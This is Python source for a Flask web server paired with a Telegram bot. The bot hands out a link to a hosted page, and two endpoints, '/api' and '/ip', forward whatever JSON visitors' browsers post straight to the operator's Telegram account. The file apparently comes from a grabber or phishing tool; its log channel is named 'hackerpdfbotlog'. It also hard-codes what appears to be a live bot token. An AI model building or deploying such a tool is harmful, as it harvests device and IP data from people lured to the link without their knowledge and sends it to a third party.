from flask import Flask, render_template, render_template_string, request, jsonify, session
import logging
import os
import json
import datetime
import telebot
import time
import os
import threading


app = Flask(__name__, template_folder='.site', static_folder='.site', static_url_path='/')





bot = telebot.TeleBot("7525871760:AAGj7NTUIxNTDq_JpBqQF3E7PvGnk8MtgT8")
channel_id = '@hackerpdfbotlog'

user_id = 1853412532
host = ""



def message(message):
    try:
            bot.send_message(user_id, message)
            print(f"Message sent to {user_id}")
    except Exception as e:
            print(f"Failed to send message to {user_id}: {str(e)}")





@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, """

    /start - Start bot \n /link - generate  link \n
     """)


@bot.message_handler(commands=['link'])
def send_welcome(message):
    bot.reply_to(message, f"""
     your link  :- {host}
     """)



def now():
    now = datetime.datetime.now()
    print(now)



def makefile(data, file_name):
    with open(file_name, 'w') as file:  
       file.write(data)


def jdata(data):
   d = json.dumps(data, indent=9)
   return d



@app.route("/")
def hello():
    return render_template("index.html")


@app.route('/api', methods=['POST', 'GET'])
def devi():
    data = request.get_json()
    io = jdata(data)
    message(io)
    return jsonify(data)



@app.route('/ip', methods=['POST', 'GET'])
def ip():
    data = request.get_json()
    hi = jdata(data)
    message(hi)
    return jsonify(data)



def Bot():
  bot.polling(none_stop=True)

def ser():
  app.run(port=8080)





if __name__ == '__main__':
    # Start Flask app in a new thread
    flask_thread = threading.Thread(target=ser)
    flask_thread.start()

    # Start Telegram bot in the main thread
    Bot()


  





